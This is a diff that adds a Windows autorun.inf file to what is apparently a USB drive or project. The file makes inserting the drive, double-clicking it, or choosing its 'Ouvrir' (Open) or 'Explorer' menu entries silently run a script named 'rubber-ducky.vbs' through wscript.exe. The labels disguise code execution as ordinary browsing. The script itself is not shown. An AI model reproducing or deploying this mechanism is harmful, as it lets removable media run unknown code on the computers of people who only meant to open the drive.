@@ -1,0 +1,7 @@
+[AutoRun]
+shellexecute=rubber-ducky.vbs
+shell\open=Ouvrir
+shell\Open\Command=wscript.exe rubber-ducky.vbs
+shell\open\Default=1
+shell\explore=Explorer
+shell\explore\Command=wscript.exe rubber-ducky.vbs
